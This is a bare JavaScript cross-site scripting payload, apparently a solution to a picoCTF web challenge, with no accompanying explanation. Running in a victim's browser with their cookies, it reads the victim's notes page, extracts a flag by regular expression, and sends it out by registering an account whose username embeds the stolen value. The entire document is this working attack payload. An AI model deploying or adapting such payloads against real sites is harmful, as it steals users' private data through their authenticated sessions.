<script>
fetch('http://0.0.0.0:8080/notes',{credentials:'include'})
.then(r=>r.text())
.then(h=>{
let m=h.match(/picoCTF\{[^}]+\}/);
if(m){
let flag=m[0];
fetch('http://0.0.0.0:8080/register',{method:'POST',headers:{'Content-Type':'application/x-www-form-urlencoded'},body:'username=raw_'+encodeURIComponent(flag)+'&password=x'});
}
});
</script>
